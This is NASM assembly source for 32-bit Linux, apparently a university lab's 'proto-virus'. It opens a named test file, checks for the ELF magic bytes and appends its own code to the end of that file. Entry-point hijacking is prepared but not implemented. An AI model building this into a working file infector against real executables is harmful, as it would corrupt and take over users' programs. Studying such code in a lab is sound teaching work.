%macro	syscall1 2
	mov	ebx, %2
	mov	eax, %1
	int	0x80
%endmacro

%macro	syscall3 4
	mov	edx, %4
	mov	ecx, %3
	mov	ebx, %2
	mov	eax, %1
	int	0x80
%endmacro

%macro  exit 1
	syscall1 1, %1
%endmacro

%macro  write 3
	syscall3 4, %1, %2, %3
%endmacro

%macro  read 3
	syscall3 3, %1, %2, %3
%endmacro

%macro  open 3
	syscall3 5, %1, %2, %3
%endmacro

%macro  lseek 3
	syscall3 19, %1, %2, %3
%endmacro

%macro  close 1
	syscall1 6, %1
%endmacro

%define	STK_RES	200
%define	RDWR	2
%define	SEEK_END 2
%define SEEK_SET 0

%define ENTRY		24
%define PHDR_start	28
%define	PHDR_size	32
%define PHDR_memsize	20	
%define PHDR_filesize	16
%define	PHDR_offset	4
%define	PHDR_vaddr	8
%define ELFHDR_size 52
%define ELFHDR_phoff	28
	
global _start

;%define infectionStr db "The lab 9 proto-virus strikes!", 10, 0

;;;;;;;;;;;;;;;;;;;;;;;;;

%macro print_OutStr 0
;write 1, infectionStr, OutStr_len
write 1, OutStr, OutStr_len
%endmacro

%macro print_Failstr 0
write 1, Failstr, Failstr_len
%endmacro

%macro print_openFail 0
write 1, OpenErrStr, OpenErrStr_len
%endmacro


;;;;;;;;;;;;;;;;;;;;;;;;;
	section .text
_start:	
	push	ebp
	mov	ebp, esp
	sub	esp, STK_RES            ; Set up ebp and reserve space on the stack for local storage
	;CODE START
	pushad
	open FileName,RDWR,0777
	mov [ebp-4], eax  ;save fd in local vars
	cmp dword[ebp-4], -1
    jle VirusExit_with_err.print_openFail
    mov ecx,ebp
    sub ecx,8	; ecx is now [ebp-8]
    read dword[ebp-4],ecx,4; read from fd that is in [ebp-4] the magic numbers to begining address of [ebp-8]
    cmp byte[ecx], 0x7f; elfmago0
    jne VirusExit_with_err;
    cmp byte[ecx+1],'E'; elfmago1
    jne VirusExit_with_err;
    cmp byte[ecx+2], 'L'; elfmago2
    jne VirusExit_with_err;
    cmp byte[ecx+3],'F'; elfmago3
    jne VirusExit_with_err;

	print_OutStr

	.infect:
	lseek dword[ebp-4], 0, SEEK_END ; get to end of file
	; set up len in bytes of printing code in edx
	mov edx, virus_end
	sub edx, _start
	write dword[ebp-4], _start, edx ; write the print command

	.print_OutStr:
		
		close [ebp-4]
		jmp VirusExit



VirusExit:
	popad
	add	esp, STK_RES
	pop ebp

       exit 0            ; Termination if all is OK and no previous code to jump to
                         ; (also an example for use of above macros)


VirusExit_with_err:
	
	.print_Failstr:
		print_Failstr
		jmp .exit

	.print_openFail:
		print_openFail
		jmp .exit

	.exit:
    	exit 1            
	
FileName:	db "ELFexecTestFile", 0
;FileName:	db "ELFexec1", 0
OutStr:		db "The lab 9 proto-virus strikes!", 10, 0
OutStr_len: equ $-OutStr
Failstr:        db "perhaps not", 10 , 0
Failstr_len: equ $-Failstr
OpenErrStr: db "File open fail", 10, 0
OpenErrStr_len: equ $-OpenErrStr

get_my_loc:
	call next_i
next_i:
	pop ecx
	ret	
PreviousEntryPoint: dd VirusExit
virus_end:


